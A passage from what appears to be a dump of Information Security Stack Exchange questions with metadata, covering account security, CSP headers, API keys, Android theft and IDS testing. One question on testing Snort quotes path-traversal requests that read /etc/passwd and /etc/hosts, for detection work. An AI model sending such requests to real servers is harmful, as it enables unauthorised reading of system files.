<p>Now I know that this is possible to be a thing in place due to a glitch as there is evidence of past passwords being saved in some systems for other reasons. <a href=""https://productforums.google.com/forum/#!topic/gmail/yM_KAywwcuk"" rel=""nofollow noreferrer"">Google used to save the past 100 passwords for a security feature</a>. I found that while trying to see if this was mentioned or documented anywhere. I couldn't find it and that's more worrying. If nobody is aware of this issue then that makes it easier to exploit. Having full access <strong>regardless of password changes</strong> to someones email for roughly 2 weeks is definitely not something we need being prevalent. Anyways I'm mostly curious on what causes this if anyone is aware, if this has been documented,and what the extent of this issue actually is. For instance, an answerer testing to see whether or not a phone that was never connected to an email can login using the old password is probably critical to know here. It's the difference between a minor annoyance and... a major security issue.</p>

<p>Confirmed services that I personally know of to have the bug:</p>

<p>Gmail
Yahoo
(I will add more if any answerers confirm others)</p>
","110264","","","","","2018-08-23 05:15:58","Email login bug, is it a security concern for email users?","<passwords><email><password-policy><account-security><iphone>","0","4","","","","CC BY-SA 4.0"
"126676","1","126683","","2016-06-10 16:10:38","","1","2971","<p>is there a way to disable app installations until you provide a certain PIN?
I have the following scenario in mind:</p>

<p>I'm a heavy Google Photos and Google Drive user, but only from my Windows computer as cloud-backups.</p>

<p>When I loose my smartphone and they ""somehow"" got access to it (even though I'm using fingerprint - but you never know. I would not bet against it that there is ANY way to break into the phone) -> Even though they I'm not yet using Google Drive or Photo Android apps, people could easily install them on the phone and as my Google account is known to the phone, they could do whatever they want with the data.</p>

<p>Is there ANY way to protect against it?
Can you trust Android lockscreen if you use fingerprint sensor or is there mostly a way around it?</p>

<p>I know I can detach devices from my granted account-access for services like Google, Dropbox, Facebook from the Web-Frontend - but what if I don't have any internet connection - or if I am away from home and I use 2-step auth using my phone? Then I can't simply login from any other computer then the one at home to revoke Account-Authentication for the mentioned apps.</p>

<hr>

<p>After thinking about my question again and reading your answers - I come to the conclusion, I didnt think the question to an end. Indeed, the core of the question is not really about preventing anyone from installing any app, because as Mike Ounsworth pointed out -> If they gain access, they can <em>somehow</em> do it for sure.</p>

<p>So I guess I should rephrase the question to: How to best protect against anyone from stealing my identity if they gain physical access to my device by stealing it or finding my lost device.</p>

<p>Is the Android safe, i.e. can I trust it so that it keeps anyone out even if they have all their tools on Windows, which are available on the darknet or anywhere else.</p>
","35367","","35367","","2016-06-10 19:02:13","2016-06-11 11:25:09","Prompt for PIN when installing Android Apps?","<android><account-security><device-locking>","3","5","","","","CC BY-SA 3.0"
"264182","1","264194","","2022-08-18 12:54:11","","0","36","<p>I made some changes to my GitHub account security, notably I added two new hardware security keys and removed SMS as a 2FA backup method.</p>
<p>8 days later today, I randomly checked the GitHub's own <a href=""https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/reviewing-your-security-log"" rel=""nofollow noreferrer"">security log</a> and found that next to these 3 events, there's also a 4th one from the same day - <code>two_factor_authentication.recovery_codes_regenerated</code>. That alarmed me a little. I went to view the codes to potentially re-generate and securely store them again, but the codes were the same as those I stored a few years ago.</p>
<p>On top of that, a new event appeared in the security log, now as expected - <code>user.two_factor_recovery_codes_viewed</code>. That surprised me because it now seems like interacting with the recovery codes falls under some sort of <code>user</code> type or namespace, instead of the <code>two_factor_authentication</code> type.</p>
<p>I tried to look up what the original event could be caused by, but to no success. I'm not too concerned right now - the fact the codes weren't touched (and the fact that regenerating them requires viewing them first) suggest this wasn't a result of someone compromising my account. Still, I'd rest easier knowing why did adding 2 hardware keys and removing an SMS number caused this weird 4th event to appear.</p>
","235715","","235715","","2022-08-18 13:33:19","2022-08-18 19:08:32","What is the two_factor_authentication.recovery_codes_regenerated security event in the GutHub account","<account-security><multi-factor><github>","1","0","","","","CC BY-SA 4.0"
"264277","1","","","2022-08-22 18:36:43","","1","159","<p>We are implementing clickjacking protection on our website as follows:</p>
<ol>
<li>By default every page on our site has frame-ancestors self</li>
<li>We have a list of pages that are specifically designed to be embeddable in 3rd party apps, so those pages don't get frame-ancestors (or they get it with specific URLs configured by the customer)</li>
<li>Our login page is non-configurable and can never be embedded.</li>
</ol>
<p>One of our developers says he has a regression. His scenario includes an embeddable component that requires the user to be logged in, but it's embedded in a CMS that typically uses the same SSO as our product (so if the user got to the page, they are by definition logged in to the IDP).</p>
<p>His flow up until now was:</p>
<ol>
<li>Embed his page on an iframe</li>
<li>His page redirects to our login page</li>
<li>Our login page redirects to SAML</li>
<li>SAML redirects to his page with Auth</li>
</ol>
<p>Now he has a regression because our login page redirects with a frame-ancestors directive.</p>
<p>I think his flow is wrong and we're trying to solve it, but since it's already in production they are looking for a quick fix on the infrastructure side.</p>
<p>I was thinking of changing our logic so that we don't send the frame-ancestors on redirect.
I feel like this should be safe, both because there shouldn't be any clickjacking on a page that wasn't loaded and because it seems like that's what the SAML IDP is doing (otherwise their flow would have failed a long time ago).
On the other hand I couldn't find anyone talking about it anywhere, so I'm a bit worried that I'm missing something.</p>
<p>So basically my question is &quot;Is it safe to not send frame-ancestors on my response if I'm responding with a redirect (e.g. 302)&quot;?</p>
","281918","","281918","","2022-08-22 18:38:10","2022-08-22 18:38:10","do I need CSP: frame-ancestors on a redirect page?","<content-security-policy><iframe><clickjacking>","0","0","","","","CC BY-SA 4.0"
"192466","1","","","2018-08-28 09:43:48","","3","196","<p>Various sites use a multi-page login. On the first page the user is chosen (i.e. email address), and on the second page, a password is given.</p>

<p>Many banks use it, Google has this also. </p>

<p>I first thought this could prevent phishing, but actually it would not. What makes this more secure, why are banks using it? It feels like a cargo cult to me: ""they use it, we better do that too.""</p>

<p><a href=""https://productforums.google.com/forum/#!topic/gmail/oAsE-6wmaSU"" rel=""nofollow noreferrer"">Google also released info about it</a> (this is all I found):</p>

<blockquote>
  <p>This new Google account sign-in flow will provide the following advantages:</p>
  
  <ul>
  <li>Preparation for future authentication solutions that complement passwords</li>
  <li>Reduced confusion among people who have multiple Google accounts</li>
  <li>A better experience for SAML SSO users, such as university students or corporate users that sign in with a different identity provider than Google </li>
  </ul>
</blockquote>

<p>But that does not seem compelling to me.</p>
","185292","","185294","","2018-08-28 09:49:06","2018-08-28 09:49:06","What is the value of multi-page login forms?","<authentication><account-security>","0","0","","2018-08-28 11:28:53","","CC BY-SA 4.0"
"264479","1","264483","","2022-08-31 10:29:44","","18","6287","<p>I have seen a few system designs in my time and one question keeps cropping up:</p>
<p>Is it bad practice to have 'super admin' - single user - or 'super admin' privileges in your system?</p>
<p>By that I mean giving one or many users 'super admin' privileges so they basically never see a &quot;you do not have permission&quot; error and are never prevented from doing anything in the system.</p>
<p>This is from a security standpoint mainly - If someone somehow managed to login to an account that has 'super admin' privileges (when they shouldn't have access) they could wreak havoc as they can change anything in the system</p>
","15982","","","","","2022-09-01 23:13:54","Is it bad practice to have a 'super admin' - so they effectively bypass security checks in your system?","<account-security>","4","4","","","","CC BY-SA 4.0"
"192539","1","192547","","2018-08-28 21:43:54","","20","9894","<p>Must my AWS account ID be kept secret? Can anything at all be done using just the AWS account ID?</p>

<p>From the <a href=""https://docs.aws.amazon.com/general/latest/gr/acct-identifiers.html"" rel=""noreferrer"">AWS documentation</a>:</p>

<blockquote>
  <p>The AWS account ID is a 12-digit number, such as 123456789012, that you use to construct Amazon Resource Names (ARNs). When you refer to resources, such as an IAM user or an Amazon Glacier vault, the account ID distinguishes your resources from resources in other AWS accounts.</p>
</blockquote>
","148825","","","","","2019-09-09 15:25:18","Keeping AWS account ID secret","<account-security><aws><amazon>","2","0","","","","CC BY-SA 4.0"
"192566","1","","","2018-08-29 07:58:09","","2","260","<p>Am I right assuming that by telling an attacker an email is or is not in the system the login is in fact weakened? Meaning if the attacker knows the email is correct he/she in fact already has 50% of the login details, no?</p>

<p><a href=""https://i.stack.imgur.com/nxZ4a.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/nxZ4a.png"" alt=""enter image description here""></a></p>
","104210","","","","","2018-08-29 13:12:30","Why do login systems tell users an email address is not in the system?","<account-security>","2","1","","2018-08-30 08:34:01","","CC BY-SA 4.0"
"192688","1","","","2018-08-30 08:24:31","","2","144","<p>The password has been a method of authentication for a long time now and we always hear of breaches happening where users passwords get stolen and sometimes are not even hashed at all or correctly. Plus there are loads of other problems with people using the password like reuse, too simple or brute forcing etc.</p>

<p>So my question is what are some ideas where we can replace the process of using a password to logon to a service or application? I know we have 2FA but I'm interested in either existing or future ideas to completely replace the password for the user.</p>

<p>A good example of what I'm on about which is sort of an alternative is typing DNA: <a href=""https://www.typingdna.com/"" rel=""nofollow noreferrer"">https://www.typingdna.com/</a> But it still uses the idea of a password for the user.</p>

<p>I think the idea is to make it as simple and convenient as the password but more secure and easy for the user to still use as a login method.</p>
","185532","","","","","2018-09-17 14:25:09","What are some existing or ideas where the use of a password can be replaced to login to a service?","<authentication><passwords><multi-factor><account-security>","4","1","","2018-10-01 18:55:17","","CC BY-SA 4.0"
"192706","1","192715","","2018-08-30 10:59:35","","5","421","<p>There is a service called <a href=""https://www.typingdna.com/"" rel=""nofollow noreferrer"">https://www.typingdna.com/</a> which authenticates users based on their typing habits and it works pretty well but it still requires a password.</p>

<p>In order to try and replace the password, would it be possible to implement a popup like sized modal such as the Google Recaptcha thing where a user would either use their mouse or finger to scribble in order to authenticate, each user must scribble in a different way? So the idea is based on everyone having their own unique scribble which would produce a match in order to authenticate a new session on a website.</p>

<p>Is this idea possible? If it was, the ""password"" space would be huge, correct?</p>
","185532","","185532","","2018-08-30 11:09:45","2018-09-17 09:47:39","Is it possible to use drawing or scribbling as a way of authentication?","<authentication><passwords><account-security>","2","6","","","","CC BY-SA 4.0"
"127266","1","","","2016-06-16 22:14:46","","2","283","<p>The company I work for is involved in security clearance work, and thus all company computers are monitored (files, screenshots, etc).  </p>

<p>I am routinely logged onto my company email service with my personal laptop.  I have some questions regarding the use of sophisticated company email services when on a remote personal computer.</p>

<ol>
<li><p>When I am logged onto the company email service, is it possible for this company email service to upload files from my computer?  Can a company email service gain access to my files in any way?</p></li>
<li><p>When I am logged onto the email service, can the company email service monitor my personal computer (recordings, screenshots, etc)?</p></li>
</ol>
","114670","","98538","","2016-06-17 06:19:38","2016-06-17 06:19:38","Can email services upload files from your computer without your permission/knowledge?","<email><file-upload><file-access><account-security>","1","2","","","","CC BY-SA 3.0"
"264506","1","265999","","2022-09-01 09:08:09","","1","202","<p>I would like to understand how the following problem is technically possible:</p>
<p>In my company, we have a machine which I and several colleagues connect to. I regularly use x11 forwarding when I connect via SSH. (I receive the data with XQuartz on MacOS.)
Today my colleague has connected to the machine via RDP and there, surprise, XQuartz opened the menu of Linux Mint, the OS of the machine, on my computer.</p>
<p>I realize that it is not my session that I control, but that of my colleague. Which is obviously a huge security problem.</p>
<p>How is this possible? Has something been misconfigured?</p>
","282276","","47524","","2022-09-02 06:09:49","2022-11-01 21:44:53","X11 forwarding to another user. How it's possible?","<ssh><account-security><rdp><x11>","1","4","","","","CC BY-SA 4.0"
"264586","1","","","2022-09-05 08:33:37","","0","498","<p>There were hundreds of emails sent from my Hotmail account between 30 Aug to 1 Sept to many Hotmail and Outlook addresses with <code>sECURED.shtml</code> attachment of 764KB. Some emails were not delivered and deleted from my inbox automatically. How can I track who did this or which program/app is doing this? Is my email compromised? Also what measures shall I take to secure my email account?</p>
","282405","","275693","","2022-09-06 15:07:13","2022-09-06 15:07:13","Is my Hotmail compromised as many emails have been sent automatically?","<email><account-security>","3","3","","","","CC BY-SA 4.0"
"127345","1","127351","","2016-06-17 16:41:48","","5","1734","<p>I'm building a long-lived session system which requires that users verify their authentication before performing ""dangerous"" operations, such as changing critical settings, deleting their account, etc. This requirement is analogous to Facebook requiring you re-enter your password before changing your email address, for example. I would like to allow the user to make dangerous changes within some period of time <code>T</code> after verifying their password.</p>

<p>The system will scale horizontally, so remembering ""who validated when"" in memory isn't possible and I'd like to avoid storing the information in the database, and looking it up on each ""dangerous"" action. I believe that leaves generating some secure time-sensitive <code>token</code> as my best alternative.</p>

<p>Here's my approach to generating and verifying this token, please let me know if you think I've overlooked anything, or am making some foolish security error. All client-server communication is over TLS/SSL.</p>

<pre><code>1. Alice wants to perform some ""dangerous"" operation (client side).
2. Alice is presented with a ""verify password"" modal or similar UI element
   where she enters her password.
3. The client-side system sends the password to the server.
4. The server checks if the password matches Alice's stored password.
5. If the passwords match, a token is generated as follows:
   a. Let `id` be Alice's user ID (UUID), `t` be a fixed length 
      string representation of the current timestamp, and `secret` 
      be a secret key appropriately protected on the server.
   b. Generate the secure part as `k = (string) HMAC(secret, id + t)` 
      (Assume `k` to be typecasted or converted to a string representation.)
   c. Finally, let `token = k + t` where `+` is the string concatenation
      operator 
6. Send the token to Alice.
7. For each ""dangerous"" operation, Alice includes `token` with the request. 
8. The server can verify the `token` by splitting `k` and `t` and
   validating `k` as in step 5.b above, and verify that time `T` hasn't
   elapsed since Alice verified her password.
</code></pre>

<p>I believe this approach solves the problem. Suggestions? Am I missing something?</p>
","114769","","114769","","2016-06-17 17:22:47","2016-06-17 17:48:16","Time Based Authentication Verification Token","<authentication><token><account-security>","2","5","","","","CC BY-SA 3.0"
"264649","1","","","2022-09-07 10:24:33","","0","121","<p>About a month ago, a friend got a security warning about some stranger signing into his Google account, so we changed his password to a strong randomly generated password with all characters (I think it was 20 characters long).</p>
<p>Today we got a new security warning about the same unknown account signing in again, what can we do to stop this intruder?</p>
<p>So far we haven't noticed this person doing anything with the account, which I find strange, but it might just be a matter of time.</p>
<p>Google refuses to be contacted in any way, as usual, absolutely worthless.</p>
","161404","","6253","","2022-09-08 07:54:10","2022-09-08 07:54:10","Unauthorized access to Google account after change of password, what now?","<account-security><google>","1","4","","","","CC BY-SA 4.0"
"52617","1","","","2014-03-03 18:31:20","","0","385","<p>When I opened ftp command prompt and typed <code>open mydomain.com</code>, it gave me the following and I think that this is a security vulnerable.</p>

<pre><code>connected to mydomain.com.
220----- Welcome to Pure-FTPd [privsep] [TLS] -----
220- you are user number 1 of 50 allowed.
220- local time is now 13:18. Server port: 21
220- IPv6 connections are also welcome on this server.
220  you will be disconnected after 15 minutes of inactivity.
user &lt;mydomain.com:&lt;none&gt;&gt;:
</code></pre>

<p>However, when I tried another websites like <code>open stackexchange.com</code>, it returned nothing.</p>

<p>Can anyone tell me how to apply more security on ftp connections on my server?</p>
","41258","","","","","2014-03-03 20:25:47","How to secure my website's FTP?","<firewalls><webserver><known-vulnerabilities><ftp><security-theater>","4","1","","","","CC BY-SA 3.0"
"264780","1","","","2022-09-13 12:57:13","","2","584","<p>How secure are Android smartphones when someone gets physical access to the phone, in other words, someone stealing my phone and how to improve this security?</p>
<p>I'm especially worried about all the accounts that I am logged into on my phone such as my google account, and my bank account which solely uses my fingerprint as login verification.</p>
<p>On Windows, I use full disk encryption with a pre-boot password. The pre-boot password is necessary in order to prevent a cold-boot attack/DMA attack in case an attacker gets physical access to my computer. Also, I'm very aware of the fact that my data on my Windows laptop is not secure if Windows is already running when the thief gets a hold of it, even if the lock screen is activated. However, other than a laptop, I usually never turn my phone completely off. Usually, my phone is always turned on and I would just use the lock screen when not using it. Completely turning the phone offline dozens of times a day would be very impracticable. This however seems to be very insecure, since even if I used device encryption the decryption key has to be somewhere in memory, ready to be accessed by everyone who steals my phone, right?</p>
<p>Also, I'm using an Honor View 20 phone, which seems to not have the functionality of encrypting my phone. There is just an option to &quot;enable the data safe&quot; which seems to only encrypt some of my personal files, but not the entire device. Unfortunately, it doesn't tell me exactly.</p>
<p>I'm very worried about the security of my personal data and especially the accounts that I'm logged into on my phone in case of it being stolen.</p>
<p>How secure is my data on an Android phone in such a case, when I'm just using the regular lock screen and fingerprint ID? Can the Android lock screen somehow be bypassed? And can I somehow get my phone just as secure as I can get a modern Windows laptop with a TPM Chip, enabled device encryption via Bitlocker and a pre-boot password?</p>
","282727","","6253","","2022-09-13 13:07:46","2022-12-28 20:20:11","Data and Account security on Android phone in case of it being stolen","<encryption><android><account-security><smartphone>","2","1","","","","CC BY-SA 4.0"
"127459","1","","","2016-06-19 10:38:39","","-5","158","<p>I had to change my account. I must have been hacked. I received a message to go to facebook.com. also settings to turn off all sms.  I don't know what to do and facebook gave me a new account. I lost all my friends and photos.</p>
","114895","","107983","","2016-06-19 11:22:34","2016-06-22 23:52:47","Lost my facebook account and all related pictures","<facebook><account-security>","1","3","","2016-06-19 16:31:42","","CC BY-SA 3.0"
"193036","1","193041","","2018-09-04 15:56:54","","0","978","<p>I need to analyze an Apache log with Snort and others IDS/WAFs (Suricata, mod_security and Shadow Daemon). In order to do so, I was thinking about create TCP packets with the GET and POST requests stored in the Apache log with Scapy in Python. Something like this:</p>

<pre><code>packet= IP(dst=dst_ip)/TCP(dport=9999)/Raw(load=payload) #payload contains the http request
</code></pre>

<p>I store this TCP packets into a PCAP file to later, analyze it with Snort or the another IDS/WAFs I said.</p>

<p>The problem with this method of building packets is that there is no state in the communication and Snort detects it with this alert:</p>

<pre><code>[**] [129:2:1] Data on SYN packet [**]
[Classification: Generic Protocol Command Decode] [Priority: 3] 
09/01-20:29:50.816860 127.0.0.1:20 -&gt; 127.0.0.1:9999
TCP TTL:64 TOS:0x0 ID:1 IpLen:20 DgmLen:102
******S* Seq: 0x0  Ack: 0x0  Win: 0x2000  TcpLen: 20
[Xref =&gt; http://www.securityfocus.com/bid/34429][Xref =&gt; http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-1157]
</code></pre>

<p>Then, I adapted the code to add a sequence and ack number:</p>

<pre><code>ip = IP(src=src_ip, dst=dst_ip)
packet = (ip / TCP(sport=src_port, dport=dest_port, flags='PA',
      seq=seq_n, ack=ack_n) / Raw(load=fullrequest[0])

seq_n = seq_n + len(payload.encode('UTF8'))
</code></pre>

<p>In this way, there is a sequence but the <strong>Data on SYN packet</strong> alert changes for another (although instead of leaving as many alerts as the same number of packages, only 22% of the packets throw an alert):</p>

<pre><code>[**] [129:12:1] Consecutive TCP small segments exceeding threshold [**]
[Classification: Potentially Bad Traffic] [Priority: 2] 
09/01-20:49:15.037299 127.0.0.1:60664 -&gt; 127.0.0.1:80
TCP TTL:64 TOS:0x0 ID:1 IpLen:20 DgmLen:94
***AP*** Seq: 0x156E7  Ack: 0xB  Win: 0x2000  TcpLen: 20
</code></pre>

<p>In the end, I chose to create a client-server structure with sockets (sending the payload from one virtual machine to another), analyze the traffic with WireShark and then save the packages as PCAP. The problem here is that Snort does not detect a single attack. In addition, I can not automate this analysis operation.</p>

<p>Attacks example:</p>

<pre><code>""GET /shoutbox.php?conf=../../../../../../../../etc/passwd HTTP/1.1""
""GET /cgi-bin/apexec.pl?etype=odp&amp;template=../../../../../../../../../../etc/hosts%00.html&amp;passurl=/category/ HTTP/1.1""
</code></pre>

<p>I am using Snort with Pulledpork to download the rules and I have tried it with a PCAP that I was using in the postgrade (not manually built) and it is detecting attacks. Maybe there is something wrong at the time of creating packets.</p>

<p>Here is my Snort and Pulledpork conf:</p>

<p>Snort: <a href=""https://uses0-my.sharepoint.com/:u:/g/personal/pabtensan_alum_us_es/EVx9mhMws7RDm-QCbE7_YUwBw7WvviZAMaJf8CjqNZFgPA?e=yJRdI1"" rel=""nofollow noreferrer"">snort.conf</a></p>

<p>Pulledpork: <a href=""https://uses0-my.sharepoint.com/:u:/g/personal/pabtensan_alum_us_es/EYTO1fA2DPtPoucsp9F-HekBzxdaaozUQOzCp49iFDOw_A?e=diwc4v"" rel=""nofollow noreferrer"">pulledpork.conf</a></p>

<p>Here are my PCAPs: </p>

<p>First way (Data on SYN packet): <a href=""https://uses0-my.sharepoint.com/:u:/g/personal/pabtensan_alum_us_es/EU57h8hVrZtKpvCk7y-NVWkB5V85QU0BZQ088TkKdOBtkg?e=23BPkZ"" rel=""nofollow noreferrer"">output.pcap</a></p>

<p>Second way (Consecutive TCP small segments exceeding threshold): <a href=""https://uses0-my.sharepoint.com/:u:/g/personal/pabtensan_alum_us_es/ET4P-fAG-6hIpy3KGY55aDEBu8-PhJWeP8ys8hPZdT9Q3w?e=BQ6xCe"" rel=""nofollow noreferrer"">output_seq.pcap</a></p>

<p>What can I be doing wrong? Any hint? Any easier way to detect attacks in an Apache log with IDS/WAF?</p>
","185885","","185885","","2018-09-04 17:09:21","2018-09-04 17:54:18","Analyzing Apache log with Snort","<python><snort><waf><mod-security><suricata>","1","3","","","","CC BY-SA 4.0"
"127766","1","","","2016-06-21 22:37:05","","1","1457","<p>I just contacted Microsoft support on my Lumia phone via the preinstalled ""Contact Support"" app, about an issue of the language of comments on apps in the Store being in the wrong language (different from my device language, and different from my account's country). After pinpointing the cause of the problem, they said I should just change the region under the ""Time and language"" section. </p>

<p>But before I left the support chat, they asked me for my email address to ""confirm"", even though they admitted that they can see my email address from the account I'm contacting them from. They wanted to send me more information about what I can try if this doesn't help. I gave them my email address. </p>

<p>And then they said that they also need my IMEI. Which was weird, so I just left. </p>

<ol>
<li>Is there any reason they should actually need my IMEI for this kind of rather simple problem with a simple solution? Is it standard routine?</li>
<li>Is there any chance that the Contact Support app was compromised on my phone and I didn't actually end up in Microsoft support?</li>
<li>What is the worst thing someone can actually do with my IMEI? Am I overreacting?</li>
</ol>

<p>(also, right at the beginning of the conversation they asked for my phone number. I asked why. They said it's standard practice if we lose connection, they will call me right back. I said it seems intrusive, and I'd rather not give it to them. They immediately apologised, and carried on with solving my problem)</p>
","115196","","9195","","2016-06-22 01:38:50","2016-06-22 01:51:00","Microsoft support asking me for my phone IMEI?","<privacy><account-security><microsoft><imei>","1","1","","","","CC BY-SA 3.0"
"193164","1","193165","","2018-09-06 11:03:39","","7","2792","<p>Domain <em>example1.com</em> embeds my iframe. </p>

<p>Domain <em>example2.com</em> embeds an iframe served from <em>example1.com</em>.</p>

<p>I would set <code>X-Frame-Options: ALLOW FROM *.example1.com</code> as well as  <code>Content-Security-Policy</code> with <code>frame-ancestors</code>.</p>

<p>But then the browser does not allow showing the iframe content, because the window's domain is <em>example2.com</em>  which  does not equal <em>example1.com</em>.</p>

<p>How can I require whitelisting for the embedder (<em>example1.com</em>) and also for the embedder's embedder (<em>example2.com</em>)?</p>
","171317","","171317","","2018-09-06 14:59:55","2018-09-06 14:59:55","How do I control multiply-nested embedding of my iframe?","<content-security-policy><iframe>","1","0","","","","CC BY-SA 4.0"
"193214","1","","","2018-09-07 10:02:23","","2","1363","<p>I'm having an issue and I'm pretty sure I'm not the first on that.
I'm hoping to have a few great ways, hopefully bulletproof, to avoid any issues, so here it is.</p>

<p>I provide an API that converts HTML to PDF via a POST request. When my customer does the conversion, they provide an API key to authenticate them. So far so good.</p>

<p>I'm thinking of offering a way to allow those customer to do the conversion directly from within the browser of their client, in Javascript.</p>

<p>Now, this is possible by doing a Javascript XHR POST request including that API key, but the big security issue here is that their API key is exposed to the public and thus can be abused.</p>

<p>My question is simple :</p>

<blockquote>
  <p>How can I offer the possibility to convert documents directly within the browser without compromising their account through the API key?</p>
</blockquote>

<p>My best idea so far is to allow my customer to create multiple API key, and have a statistics about how many conversions were done from that key. Moreover, they could indicate which domain works for that key, restricting the usage to a specific (set of) domain(s).</p>

<p>But I know that this is not bulletproof as any coder can spoof the ""host"" value on a request, and bypassing this ""security"".</p>

<p>How can I increase the security while offering the frontend capability?</p>

<p>Thanks for your help!</p>
","9611","","","","","2019-02-11 01:29:38","How to secure an API key from client side?","<javascript><account-security><api>","0","6","","","","CC BY-SA 4.0"
"265083","1","","","2022-09-28 10:39:02","","1","67","<p>I had a discussion with PenTesters at my company today, who have said that security headers, like for example Content-Security-Policy, Strict-Transport-Security, Referrer-Policy and Permissions-Policy, should always be sent in the subsequent requests within one page (e.g. Images, Angular), even if they were sent already with the main request (in our case a JSF page).</p>
<p>My understanding was always that those things are inherited from the main request to the subsequent request and they don't add any security if sent with those.</p>
<p>Apart from the argument that they do not add much in size, is there any reason to include them in the subsequent request? From the point of view of user security or exploitability? I wasn't able to think up a reason why they should be included.</p>
<p>Example of the network trace:</p>
<pre><code>https://somehost/request.jsf -&gt; headers sent
https://somehost/angular-package.js -&gt; no headers sent
https://somehost/logo.png -&gt; no headers sent
https://somehost/font1.woff -&gt; no headers sent

-- User navigates to another page --

https://somehost/request2.jsf -&gt; headers sent
https://somehost/angular-package.js -&gt; no headers sent
https://somehost/additionalImage.png -&gt; no headers sent
</code></pre>
","283329","","129883","","2022-09-28 14:30:45","2023-06-27 03:04:55","Security headers: Are they needed on subsequent requests (eg. Scripts, Images) after they have been sent on the main HTML request?","<content-security-policy><header>","1","1","","","","CC BY-SA 4.0"
"265089","1","","","2022-09-28 15:09:26","","1","106","<p>I'm not talking about showing them a popup <em>upon api key generation</em>, where the user is specifically warned about the fact that</p>
<blockquote>
<p>This is the only time you will see it. Make sure to save this to a safe place.</p>
</blockquote>
<p>Instead, I'm talking about platforms, like RapidApi, where the ApiKey is automatically filled-in for each Api in the platform, whether the user is subscribed to an Api or not.<br />
<a href=""https://i.stack.imgur.com/bNDot.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/bNDot.png"" alt=""enter image description here"" /></a><br />
(example from RapidApi)</p>
<p>Putting aside the fact that on RapidApi you can even use just a single ApiKey for each subscribed Api, instead of generating a new and unique ApiKey for a specific Api, how do they do that?<br />
If the frontend is able to fill automatically the <code>X-RapidApi-Key</code> field, (I suppose) it means that the frontend is asking their backend what is my ApiKey.<br />
Also that means that the ApiKey itself could not be hashed in their databases, but <em>at least</em> it is encrypted and decrypted upon demand.<br />
Eventually I suppose they are encrypting the API on the backend and sending it to the frontend, which is then decrypting it with a public key?
Alternatively it is just plain text in their database or I'm missing something.<br />
On other API platforms, the ApiKey is exposed only upon generation and it is up to the user to save it and use it. Which is pretty much secure, but of course it's not that handy if a user is able to use multiple API/ApiKeys.</p>
","283339","","","","","2022-09-28 15:09:26","Presenting users their API Keys on frontend","<encryption><web-application><account-security><api><storage>","0","0","","","","CC BY-SA 4.0"
"265220","1","","","2022-10-03 15:15:53","","1","54","<p>My company has one SSO provider that we use for our back office apps.  We're looking at tightening security for our SaaS offering.  We have a fork in the road for implementation - we can either continue using non-SSO (Spring Security) and enforcing prod and dev to have different credentials, or we could use our SSO provider for our company's people.  I don't have the security chops to say which one is more secure.  Though managing everything through SSO would be much easier because it's connected to our company AD.</p>
","283565","","","","","2022-10-03 15:15:53","Is using the same SSO for dev and prod considered safe?","<account-security><sso>","0","1","","","","CC BY-SA 4.0"
"265229","1","","","2022-10-03 21:52:20","","1","122","<p>in the CRS v3.3.3 update, some Content-Types allowed in rule 900220 were removed and explanatory comment added, but it generated a doubt when I saw that text/plain was removed from this list.</p>
<p>Why not allow text/plain by default in Content-Types ? I ask because apparently many simple apps use text/plain CT.</p>
<p>n my understanding, plain text parsing would not need a specific content processor, unlike JSON and XML which have standard structures and demarcations. That's why I didn't understand the removal of the Content-Type &quot;text/plain&quot;</p>
<p>Following the idea that there is no body processor for Content-Type text/plain, so it looks like parsing is stuck exclusively on Content-Type, if in text/plain it is not possible to parse the body by default (core function) then would modsecurity be useful for parsing the body only for applications that work with JSON and XML?</p>
<p>I'm confused, but I hope you can clarify</p>
","283584","","485","","2022-10-04 12:17:52","2022-10-04 12:17:52","text/plain removed from list Content-Types default","<mod-security>","1","0","","","","CC BY-SA 4.0"
"265238","1","265264","","2022-10-04 08:17:20","","2","87","<p>This is a slightly tough one to explain with my current experience, lacking mainstream terminology. But here goes.</p>
<p>I have an encryption/security model whereby I do not store users plaintext passwords. It's pretty simple actually:</p>
<p>1 - on sign up users plaintext password is hashed with one algorithm, this hash is stored as users password for authentication purposes.</p>
<p>2 - the plaintext password is also hashed another way, this produces the users encryption key encryption password (AES 256) through key derivation.</p>
<p>So on sign in if the hash does not match the users storage password (#1) auth fails and no attempt is made for decryption or secondary hash. Simple.</p>
<p>Problem comes logically where I want to use biometricID for both android and iOS. Biometric auth only returns a boolean while autofilling text fields does return plaintext password saved in iOS keychain &amp; equivalent for android. So I actually need the users plaintext password to create the correct hashes. BUT I'm confused as to how implement biometric auth as well as get users plaintext password on sign in all while maintaining strong security.</p>
<p>So I guess my question becomes this: how do current systems with some sort of encryption model requiring plaintext passwords on sign in use biometric auth to maintain a high degree of security? After all, just about every credit card app and banking app I have uses biometric auth... are they storing plaintext passwords or just storing an initial hash?</p>
<p>EDIT: it has dawned on me that I could use bio-auth as a second layer of security but this still defeats the purpose of bio-auth and actually adds a layer of inconvenience no matter how slight and STILL requires manual or system credential autofill.</p>
","249539","","249539","","2022-10-04 20:23:06","2022-10-05 05:46:07","How can a users plaintext password be acquired while using biometricID with the following security model?","<hash><password-management><account-security><biometrics><single-sign-on>","2","0","","","","CC BY-SA 4.0"
"265276","1","265277","","2022-10-05 15:25:25","","2","91","<p>Let's say the Content Security Policy looks like this:</p>
<pre><code>Content-Security-Policy: default-src 'self';
</code></pre>
<p>It's also not possible to upload JS files on the same origin.</p>
<p>Now there's an exploit to write arbitrary HTML on a page, including <code>&lt;script&gt;</code>. But <code>&lt;script&gt;</code> among other tags can't execute any scripts because of the CSP. When writing a report, should I still call it Cross Site Scripting (even though no script is executed) or would it be more accurate to say &quot;HTML injection&quot;?</p>
","283655","","","","","2022-10-05 21:39:15","Should I call a vulnerability XSS even though it is blocked by the CSP?","<xss><web><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"193515","1","","","2018-09-11 20:07:22","","1","950","<p>I've got a dilemma here: I'm working on a system that will connect to remote linux servers for monitoring and automating some processes. Since user+pass is insecure for obvious reasons and public/private key pairs exist for a reason, my site generates a key pair and gives the public key to the user (for uploading to their server) <strong>but</strong> in case the user forgets their public key I'd like to give them a way to recover it.</p>

<p>However, if I encrypt the public key with the user's password, if a hacker gets into the database, even if the password is hashed, they can use that hash to decrypt the public key, so it would make no sense. I started to think in using OTP instead and ask it at key generation phase and key view phase. </p>

